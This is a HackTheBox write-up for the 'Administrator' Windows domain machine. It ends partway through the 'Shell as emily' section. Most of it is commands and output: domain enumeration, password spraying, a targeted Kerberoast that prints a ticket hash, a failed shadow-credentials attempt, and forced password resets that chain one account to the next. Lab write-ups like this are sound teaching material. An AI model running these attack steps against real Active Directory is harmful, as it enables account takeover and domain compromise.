---
render_with_liquid: false
title: HackTheBox Writeup - Administrator
date: 2024-11-11 17:51:44 +1400
tags: [hackthebox, nmap, windows, ad, assumed-breach, ftp, netexec, password-spraying, brutespray, ldeep, bloodhound, bloodhound-python, lftp, password-safe-v3, hashcat, evil-winrm, targeted-kerberoast, dcsync, impacket, oscp-like-2023]
image:
    path: https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png
    width: 640
    height: 480
---



`Administrator` is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the `michael` account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user `olivia` has `GenericAll` permissions over `michael`, allowing us to reset his password. With access as `michael`, it is revealed that he can force a password change on the user `benjamin`, whose password is reset. This grants access to `FTP` where a `backup.psafe3` file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user `emily`. Further enumeration shows that `emily` has `GenericWrite` permissions over the user `ethan`, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for `ethan`, who is found to have `DCSync` rights ultimately allowing retrieval of the `Administrator` account hash and full domain compromise.

# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ pt init '10.129.9.33 administrator.htb DC.administrator.htb DC'
+---------------+--------+-------------+----------------------+
|    PROFILE    | STATUS |     IP      |        DOMAIN        |
+---------------+--------+-------------+----------------------+
| administrator | on     | 10.129.9.33 | administrator.htb    |
| administrator | on     | 10.129.9.33 | DC.administrator.htb |
| administrator | on     | 10.129.9.33 | DC                   |
+---------------+--------+-------------+----------------------+
```

## Nmap

```bash
# Nmap 7.94SVN scan initiated Mon Nov 11 17:51:43 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,61892,62306,62311,62322,62336,62369, 10.129.51.42
Nmap scan report for 10.129.51.42
Host is up, received user-set (0.28s latency).
Scanned at 2024-11-11 17:51:44 CST for 117s

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-11-11 16:51:53Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61892/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62306/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
62311/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62322/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62336/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62369/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18723/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 56967/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 43019/udp): CLEAN (Failed to receive data)
|   Check 4 (port 54596/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7h00m01s
| smb2-time: 
|   date: 2024-11-11T16:53:24
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 11 17:53:41 2024 -- 1 IP address (1 host up) scanned in 117.24 seconds
```

## 21 - FTP

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ ftp -A ftp://anonymous:''@$(pt get rhost)
Connected to administrator.htb.
220 Microsoft FTP Service
331 Password required
530 User cannot log in.
ftp: Login failed
ftp: Can't connect or login to host `administrator.htb:ftp'
221 Goodbye.
```

## 53 - DNS

### DNS Reverse Lookup

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ dig -p 53 -x $(pt get rhost) @$(pt get rhost)
;; communications error to 10.129.51.42#53: timed out
;; communications error to 10.129.51.42#53: timed out
;; communications error to 10.129.51.42#53: timed out

; <<>> DiG 9.20.2-1-Debian <<>> -p 53 -x administrator.htb @administrator.htb
;; global options: +cmd
;; no servers could be reached
```

### DNS Zone Transfer

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ dig AXFR -p 53 @$(pt get rhost) $(pt get rhost)

; <<>> DiG 9.20.2-1-Debian <<>> AXFR -p 53 @administrator.htb administrator.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### DnsRecon Default Scan

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ dnsrecon -n $(pt get rhost) -d $(pt get rhost)
[*] std: Performing General Enumeration against: administrator.htb...
[-] DNSSEC is not configured for administrator.htb
[*]      SOA dc.administrator.htb 10.129.51.42
[*]      NS dc.administrator.htb 10.129.51.42
[*]      A administrator.htb 10.129.51.42
[*] Enumerating SRV Records
[+]      SRV _ldap._tcp.administrator.htb dc.administrator.htb 10.129.51.42 389
[+]      SRV _kerberos._tcp.administrator.htb dc.administrator.htb 10.129.51.42 88
[+]      SRV _kerberos._udp.administrator.htb dc.administrator.htb 10.129.51.42 88
[+]      SRV _gc._tcp.administrator.htb dc.administrator.htb 10.129.51.42 3268
[+]      SRV _ldap._tcp.dc._msdcs.administrator.htb dc.administrator.htb 10.129.51.42 389
[+]      SRV _ldap._tcp.pdc._msdcs.administrator.htb dc.administrator.htb 10.129.51.42 389
[+]      SRV _ldap._tcp.ForestDNSZones.administrator.htb dc.administrator.htb 10.129.51.42 389
[+]      SRV _kpasswd._udp.administrator.htb dc.administrator.htb 10.129.51.42 464
[+]      SRV _kerberos._tcp.dc._msdcs.administrator.htb dc.administrator.htb 10.129.51.42 88
[+]      SRV _ldap._tcp.gc._msdcs.administrator.htb dc.administrator.htb 10.129.51.42 3268
[+]      SRV _kpasswd._tcp.administrator.htb dc.administrator.htb 10.129.51.42 464
[+] 11 Records Found
```

### Subdomain Enumeration

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_subdomains.txt -t 100 -d $(pt get rhost) -r $(pt get rhost)
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     administrator.htb
[+] Threads:    100
[+] Resolver:   administrator.htb
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dc.administrator.htb

Found: gc._msdcs.administrator.htb

Found: domaindnszones.administrator.htb

Found: forestdnszones.administrator.htb

Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc smb $(pt get rhost) -u '' -p ''
nxc smb $(pt get rhost) -u 'a' -p ''
nxc smb $(pt get rhost) -u 'Guest' -p ''
SMB         10.129.51.42    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
	SMB         10.129.51.42    445    DC               [+] administrator.htb\:
SMB         10.129.51.42    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.51.42    445    DC               [-] administrator.htb\a: STATUS_LOGON_FAILURE
SMB         10.129.51.42    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.51.42    445    DC               [-] administrator.htb\Guest: STATUS_ACCOUNT_DISABLED
```

### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc smb $(pt get rhost) -u '' -p '' --shares
SMB         10.129.51.42    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.51.42    445    DC               [+] administrator.htb\:
SMB         10.129.51.42    445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

### Groups & Users

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc smb $(pt get rhost) -u '' -p '' --rid-brute | tee enum/nxc_rid_brute.log
SMB                      10.129.51.42    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB                      10.129.51.42    445    DC               [+] administrator.htb\:
SMB                      10.129.51.42    445    DC               [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc smb $(pt get rhost) -u '' -p '' --users
SMB         10.129.51.42    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.51.42    445    DC               [+] administrator.htb\:
```

# User Flag
---

## Auth as Olivia


### Assumed breach scenario

> A pair of credential was provided by the box creator : `Olivia:ichliebedich`

![](/assets/obsidian/a8510ac079a44d4e013ed9f668a02adc.png)

## Auth as michael

### Active directory environment setup

Setup variables

```bash
pt set user 'Olivia'; pt set pass 'ichliebedich'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
pt set dc_name "DC"; pt set dc_fqdn "DC.administrator.htb"
```

Sync time with DC

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ sudo ntpdate -u $(pt get rhost)
2024-11-12 21:20:52.641579 (+0800) +31825.850943 +/- 0.138857 administrator.htb 10.129.7.55 s1 no-leap
CLOCK: time stepped by 31825.850943
```

Configure kerberos

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ sudo ~/scripts/ad/configure_krb5.py $(pt get domain) $(pt get dc_name)
[*] Configuration Data:
[libdefault]
        default_realm = ADMINISTRATOR.HTB

[realms]
        ADMINISTRATOR.HTB = {
                kdc = dc.administrator.htb
                admin_server = dc.administrator.htb
        }

[domain_realm]
        administrator.htb = ADMINISTRATOR.HTB
        .administrator.htb = ADMINISTRATOR.HTB

[*] Previous config backed up to /etc/krb5.conf~
[+] /etc/krb5.conf has been configured
```

### Password spray

> Brutespray (Tool) - https://github.com/x90skysn3k/brutespray

```bash
/opt/sectools/password-attacks/BruteForce/brutespray -q -f ./nmap/all_tcp_ports.gnmap -u ldeep/_users_enabled.lst -p "$(pt get pass)"
```

![](/assets/obsidian/32516e9931c89effdf1e9a2d3d192443.png)

### 445 - SMB enumeration

Check shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" --shares
SMB         10.129.7.55     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.55     445    DC               [+] administrator.htb\Olivia:ichliebedich
SMB         10.129.7.55     445    DC               [*] Enumerated shares
SMB         10.129.7.55     445    DC               Share           Permissions     Remark
SMB         10.129.7.55     445    DC               -----           -----------     ------
SMB         10.129.7.55     445    DC               ADMIN$                          Remote Admin
SMB         10.129.7.55     445    DC               C$                              Default share
SMB         10.129.7.55     445    DC               IPC$            READ            Remote IPC
SMB         10.129.7.55     445    DC               NETLOGON        READ            Logon server share
SMB         10.129.7.55     445    DC               SYSVOL          READ            Logon server share
```

Since we have access to `SYSVOL` share, try harvest GPP data

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ Get-GPPPassword.py "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"@"$(pt get dc_fqdn)"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Listing shares...
  - ADMIN$
  - C$
  - IPC$
  - NETLOGON
  - SYSVOL

[*] Searching *.xml files...
```

### 389 - Domain enumeration


#### Ldeep

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ mkdir -p ldeep && ldeep ldap -u "$(pt get user)" -p "$(pt get pass)" -d "$(pt get domain)" -s ldap://$(pt get ip) all ldeep/
[+] Retrieving auth_policies output
[+] Retrieving auth_policies verbose output
[+] Retrieving bitlockerkeys output
[+] Retrieving bitlockerkeys verbose output
[+] Retrieving computers output
[+] Retrieving conf output
[+] Retrieving delegations output
[+] Retrieving delegations verbose output
[+] Retrieving delegations verbose output
[+] Retrieving delegations verbose output
[+] Retrieving delegations verbose output
[+] Retrieving domain_policy output
[+] Retrieving domain_policy verbose output
[+] Retrieving fsmo output
[+] Retrieving fsmo verbose output
[+] Retrieving gmsa output
[+] Retrieving gmsa verbose output
[+] Retrieving gpo output
[+] Retrieving gpo verbose output
[+] Retrieving groups output
[+] Retrieving groups verbose output
[+] Retrieving machines output
[+] Retrieving machines verbose output
[+] Retrieving ou output
[+] Retrieving ou verbose output
[+] Retrieving pkis output
[+] Retrieving pkis verbose output
[+] Retrieving pso output
[+] Retrieving sccm output
[!] invalid class in objectClass attribute: mssmsmanagementpoint. SCCM may not be installed
[+] Retrieving sccm verbose output
[!] invalid class in objectClass attribute: mssmsmanagementpoint. SCCM may not be installed
[+] Retrieving shadow_principals output
[+] Retrieving shadow_principals verbose output
[+] Retrieving silos output
[+] Retrieving silos verbose output
[+] Retrieving smsa output
[+] Retrieving smsa verbose output
[+] Retrieving subnets output
[+] Retrieving subnets verbose output
[+] Retrieving templates output
[+] Retrieving templates verbose output
[+] Retrieving trusts output
[+] Retrieving trusts verbose output
[+] Retrieving users output
[+] Retrieving users verbose output
[+] Retrieving users verbose output
[+] Retrieving users verbose output
[+] Retrieving users verbose output
[+] Retrieving users verbose output
[+] Retrieving users verbose output
[+] Retrieving users verbose output
[+] Retrieving users verbose output
[+] Retrieving users verbose output
[+] Retrieving users verbose output
[+] Retrieving zones output
[+] Retrieving zones verbose output
```

Check **asreproast** and **kerberoast**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ cat ldeep/*_users_nokrbpreauth.lst

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ cat ldeep/*_users_spn.json | jq '.[] | {sAMAccountName, servicePrincipalName}'
```

Group users by group

- `Olivia` can remote **winrm** to domain computers
- `benjamin` have a custom group : `Share Moderators`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; reduce $item.memberOf[] as $group (.; .[$group] = (.[$group] // []) + [$item.sAMAccountName]))'
{
  "CN=Remote Management Users,CN=Builtin,DC=administrator,DC=htb": [
    "emily",
    "michael",
    "olivia"
  ],
  "CN=Share Moderators,CN=Users,DC=administrator,DC=htb": [
    "benjamin"
  ],
  "CN=Denied RODC Password Replication Group,CN=Users,DC=administrator,DC=htb": [
    "krbtgt"
  ],
  "CN=Guests,CN=Builtin,DC=administrator,DC=htb": [
    "Guest"
  ],
  "CN=Group Policy Creator Owners,CN=Users,DC=administrator,DC=htb": [
    "Administrator"
  ],
  "CN=Domain Admins,CN=Users,DC=administrator,DC=htb": [
    "Administrator"
  ],
  "CN=Enterprise Admins,CN=Users,DC=administrator,DC=htb": [
    "Administrator"
  ],
  "CN=Schema Admins,CN=Users,DC=administrator,DC=htb": [
    "Administrator"
  ],
  "CN=Administrators,CN=Builtin,DC=administrator,DC=htb": [
    "Administrator"
  ]
}
```

Check custom groups info

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ cat ldeep/*_groups.json | jq 'map(select(.isCriticalSystemObject != true)) | map(del(.cn,.dSCorePropagationData,.dn,.groupType,.instanceType,.name,.objectClass,.objectGUID,.sAMAccountName,.sAMAccountType,.uSNChanged,.uSNCreated,.whenCreated,.objectCategory,.member)) | sort_by(.whenChanged)'
[
  {
    "description": [
      "DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers)."
    ],
    "distinguishedName": "CN=DnsUpdateProxy,CN=Users,DC=administrator,DC=htb",
    "objectSid": "S-1-5-21-1088858960-373806567-254189436-1102",
    "whenChanged": "2024-10-04T19:54:08+00:00"
  },
  {
    "description": [
      "DNS Administrators Group"
    ],
    "distinguishedName": "CN=DnsAdmins,CN=Users,DC=administrator,DC=htb",
    "objectSid": "S-1-5-21-1088858960-373806567-254189436-1101",
    "whenChanged": "2024-10-04T19:54:08+00:00"
  },
  {
    "distinguishedName": "CN=Share Moderators,CN=Users,DC=administrator,DC=htb",
    "objectSid": "S-1-5-21-1088858960-373806567-254189436-1111",
    "whenChanged": "2024-10-06T02:09:52+00:00"
  }
]
```

#### Bloodhound

Collector

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ bloodhound-python -d $(pt get domain) -ns $(pt get ip) -c all --zip -u "$(pt get user)" -p "$(pt get pass)"
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 54S
INFO: Compressing output into 20241112220931_bloodhound.zip
```

Set `Olivia` as owned

![](/assets/obsidian/8760b99a8bb2620202ed30a384080ce4.png)

Search `Shortest Paths to High Value Targets`

![](/assets/obsidian/a9acb9f8c013b2714ff90e87dc018df6.png)

- `Ethan` have **DCSync** permission over the domain
- `Michael` have **GenericALL** permission to `Account Operators`

![](/assets/obsidian/206a8090f89dcf916b846d030903692f.png)

Mark `Ethan` and `Michael` as **High Value Targets**

![](/assets/obsidian/b7e95eb05128abcf76c34d5dc04bc288.png)

![](/assets/obsidian/1b044122eb42e503963a5be0709e98ac.png)

Click on `Michael` and get outbound object control

![](/assets/obsidian/7dc0a9348aa4b3bc80e22ea35e9d892f.png)

- `Michael` can force change `Benjamin`'s password

![](/assets/obsidian/188a1e579d31a7f42158e5ab0a97c017.png)

### PWN path simulation

- `Olivia` -> `Michael` (Targeted kerberoast / Force change password / Shadow credential)
	- `Michael` -> `Benjamin` (Change password)
			- `Benjamin` -> `Ethan` (Assume `Share Moderators` group members have special permission over smb, ftp shares or local files)
				- **DCSync**

### (Failed) Targeted kerberoast on Michael

Get **outbound object control** from `Olivia`

![](/assets/obsidian/19e2c152d9c31c83b10d6e7ed4f7ddbc.png)

- `Olivia` have `GenericALL` permission over `Michael`

![](/assets/obsidian/c371eb5754f6147e2cf4313498b86a63.png)

![](/assets/obsidian/3ca91f5237f46ba89a81a57f10418c5a.png)

![](/assets/obsidian/a3f459098fe6c85296cd674fc91471df.png)

Force set SPN on `michael`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ python /opt/sectools/ad/targetedKerberoast/targetedKerberoast.py -v -d "$(pt get domain)" -u "$(pt get user)" -p "$(pt get pass)"
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (michael)
[+] Printing hash for (michael)
$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$851a8d2644b2ccda7ecf4a9827de39b4$818b3a3e75ba4c6edc8282e36f85bc9eb95f8ab37ce85721942bad2285efec72424d0e544109ba7193d604e3e5b7af3d9af95a88606719c5d5037d08236cea9f60cd68b7ac824afb17025e3a7800416c52a21c76bf0113d18419611641a3bf37c4b2d73130310f69a320da50ccb1f4f08dd6a334c15a32312a1962bb7a5306e4da893c9c9db5e2377165f3a49050e8196d52cf8cc01d24532a39cff74268fc7a6b1256c1200e6220e651f2748cc1de921c27aa2974dc2beab15af935e7095bc5f9d20f46c143339ae04976551e861fef200d3d331ce79b5e708c14a954bcbed358ae876b233964c8395326ea0f6e396d8408a06f5ed81a1c38a0b2c3f0f7f65cbcccf5014b548f2d62035ba50a79584a46a003e78eb78c310223f76f79d3024f0c09b003353e83afdef0f2f954ad219d0195c3654aa529fc5f3a3a876c87d9aa3e5b7d194988472fdc53a81c64cc682b597d0b67701bbb424edf09f1ad6fbb9974b7b6573c9348a5141a5afedb3eee0ce577704dd0a6f88c5131fe8ebaf75eab2b92260cad94ae7cdd993b6ee2a0f8d9673179f63389789ca2c332b4b88be69fc769ae4535feefe2e0513b16e200420005b09a75fb0c1401c8a245c757f34d0e87c20438f7879ed8e00733f9bcb0ac25847af8e09a3716200a19123647a65ef738fda3df058149949d27bc3d06144a9085e7ce01e9e54516d8447e78d061aabfa96bf1de6e8de30a8fe944160bbc9eb914a20b45cd1a08fdebf16d41f05ce7229951481cf50ebac4bb8e69690f33fd53d8ce239aad4fcc2d499d694692760f4711e6b0778d0f541e08bfb49acf79064b40f3d8fa3a926b4b53588a360d4ab28367e602ea185a34cd06c09345d1ff7611211ec6f2d614122925960481bc1d15f7d8a0fcb96bbf22faa7ee8cafce44f348241e3711197e34791a8381eef8bd4ad69897de105b3e5ac4c1daf00b3fe8dc7cca54034b50578c9393361ce394e488c5bb42abe7beb972e039da7adfd190ad80644f6b48d30270be73927d22d38a43553a167f82318c062cf5fbeb8d420f47652046c61b4e2c2a39c99796ade092b81fd60d7d6dc755417c7a4e96d3d24141e8e7cb428db29abd86fe0129b6625b1c8601ad18ad92e1e6441e346bf946b2963c25570e9719a478096e19cbcc19b63c8aa8f9065ad2d2a503ee3cc9926906097891308860fabf9fc93f37d41cf69e0693bfbcd3b8054fa8d1c941cb51f0030ccbd46dffbd441a1ca783342622dbfeef4829b531ec72ec88a060c4aacbefc083462ad295959cd2a2e85c385c32f460d2b642f7d4870d17769886cd87346d6db161c74f8044a19d2aa51802d66d72cc384e538b8fbb83b52d049e807bc00be179d6b815a402a48ae72611358c14fecb0b2a30dcf81d95eb7fbd3ff29f243f243e86e2266de314502f38b0e24b379db2aa0d9b577c06b3a9ea6eaf3461cf9952afc4efeb7823d82dce810ae33b58b4c76551f378cb56993cb039a4b5617cd49bfd247fd4c4ed143801ad
[VERBOSE] SPN removed successfully for (michael)
```

Crack the hash (Failed)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ vi loot/kerberoast.hash
```

```bash
hashcat loot/kerberoast.hash /usr/share/wordlists/fasttrack.txt --rules /usr/share/hashcat/rules/best64.rule
hashcat loot/kerberoast.hash /opt/wordlists/rockyou.txt --rules /usr/share/hashcat/rules/best64.rule
```

### (Failed) Shadow credentials attack on Michael

![](/assets/obsidian/1086267aeaad687ded56efbbb8419f96.png)

> **pyWhisker** is bugged at the time (2024/11/12), using **bloodyAD** as an alternative
{: .prompt-tip }

> BloodyAD documents for shadow credential attack - https://github.com/CravateRouge/bloodyAD/wiki/User-Guide#add-shadowcredentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ bloodyAD --host 10.129.7.55 -d "$(pt get domain)" -u "$(pt get user)" -p "$(pt get pass)" add shadowCredentials "Michael"
[+] KeyCredential generated with following sha256 of RSA key: 168f33abbe22c897af155c46ca805634a3c4bd0f6ca801e254846c96f461f71f
No outfile path was provided. The certificate(s) will be stored with the filename: zeoLFcz4
[+] Saved PEM certificate at path: zeoLFcz4_cert.pem
[+] Saved PEM private key at path: zeoLFcz4_priv.pem
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following command to obtain a TGT:
python3 PKINITtools/gettgtpkinit.py -cert-pem zeoLFcz4_cert.pem -key-pem zeoLFcz4_priv.pem administrator.htb/Michael zeoLFcz4.ccache

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ python /opt/sectools/ad/PKINITtools/gettgtpkinit.py -cert-pem zeoLFcz4_cert.pem -key-pem zeoLFcz4_priv.pem administrator.htb/Michael zeoLFcz4.ccache
2024-11-12 23:30:09,904 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-11-12 23:30:09,917 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
Traceback (most recent call last):
  File "/opt/sectools/ad/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
  File "/opt/sectools/ad/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
  File "/opt/sectools/ad/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
          ^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)"
```

- **ADCS** was not installed on DC, so shadow credential attack won't work. The only option left is to change `Michael`'s password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc ldap $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -M adcs
SMB         10.129.7.55     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
LDAP        10.129.7.55     389    DC               [+] administrator.htb\Olivia:ichliebedich
ADCS        10.129.7.55     389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
```

### Force change Michael's password

![](/assets/obsidian/c8e3ed8dff0b4cd83cebccf79e58a40d.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ net rpc password "Michael" "newP@ssword2024" -U "$(pt get domain)"/"$(pt get user)"%"$(pt get pass)" -S "$(pt get rhost)"
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ pt set user 'Michael'; pt set pass 'newP@ssword2024'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
Michael:newP@ssword2024

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" --shares
SMB         10.129.7.55     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.55     445    DC               [+] administrator.htb\Michael:newP@ssword2024
```

Set `Michael` as owned

![](/assets/obsidian/ad628e831ae5c0f4b08b5c87fab5e673.png)

## Auth as benjamin


### Force change benjamin's password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ net rpc password "benjamin" "newP@ssword2024" -U "$(pt get domain)"/"$(pt get user)"%"$(pt get pass)" -S "$(pt get rhost)"
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ pt set user 'benjamin'; pt set pass 'newP@ssword2024'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
benjamin:newP@ssword2024

┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)"
SMB         10.129.7.55     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.55     445    DC               [+] administrator.htb\Michael:newP@ssword2024
```

Set `benjamin` as owned

![](/assets/obsidian/140f5f0d046efcce9c3a272f5672ddbb.png)

## Shell as emily


### Password spray

```bash
/opt/sectools/password-attacks/BruteForce/brutespray -q -f ./nmap/all_tcp_ports.gnmap -u "$(pt get user)" -p "$(pt get pass)"
```

![](/assets/obsidian/87e21a64efafb59e57b048c62a0679a8.png)

### 445 - SMB

- No special permissions over smb shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Administrator]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" --shares
SMB         10.129.7.55     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.55     445    DC               [+] administrator.htb\benjamin:newP@ssword2024
SMB         10.129.7.55     445    DC               [*] Enumerated shares
